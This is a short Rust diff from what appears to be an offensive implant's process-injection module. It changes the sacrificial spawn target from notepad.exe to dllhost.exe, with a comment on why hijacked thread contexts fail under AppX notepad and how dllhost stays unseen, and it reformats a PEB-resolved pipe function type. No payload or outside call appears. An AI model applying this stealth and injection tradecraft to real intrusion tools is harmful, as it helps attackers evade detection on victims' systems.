@@ -72,7 +72,17 @@ const DRAIN_CAP: usize = 1 << 20;
 
 /// Sacrificial child image. Same default as `do_inject` (a GUI process: no
 /// conhost window flash when stdout is a pipe, OPSEC-clean).
-const SPAWN_TO: &str = "notepad.exe";
+///
+/// **dllhost.exe, NOT notepad.exe**: on Windows 11 24H2+ the system32
+/// notepad.exe is an AppX activation stub — CreateProcessW starts the
+/// Microsoft.WindowsNotepad package, whose activation re-initializes the
+/// process after resume and silently discards the hijacked thread context
+/// (the child then boots the real GUI app, which hangs headless and dies to
+/// the 60 s timeout — empirically exit 0b0101 on windows-latest). dllhost.exe
+/// (COM+ surrogate) is a plain non-AppX GUI-subsystem image present on every
+/// Windows version, has no singleton semantics, and never touches the
+/// desktop when hijacked.
+const SPAWN_TO: &str = "dllhost.exe";
 
 // ---- Win32 fn-pointer types (PEB-walked per call, crate convention) ----
 
@@ -82,14 +92,8 @@ type WaitForSingleObjectFn = unsafe extern "system" fn(*mut c_void, u32) -> u32;
 type GetExitCodeProcessFn = unsafe extern "system" fn(*mut c_void, *mut u32) -> i32;
 type TerminateProcessFn = unsafe extern "system" fn(*mut c_void, u32) -> i32;
 type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;
-type PeekNamedPipeFn = unsafe extern "system" fn(
-    *mut c_void,
-    *mut u8,
-    u32,
-    *mut u32,
-    *mut u32,
-    *mut u32,
-) -> i32;
+type PeekNamedPipeFn =
+    unsafe extern "system" fn(*mut c_void, *mut u8, u32, *mut u32, *mut u32, *mut u32) -> i32;
 
 /// The reclaim-phase kernel32 exports, resolved once (shell.rs ShellExports
 /// precedent). The pipe read handle itself is owned by [`PipeRead`], not
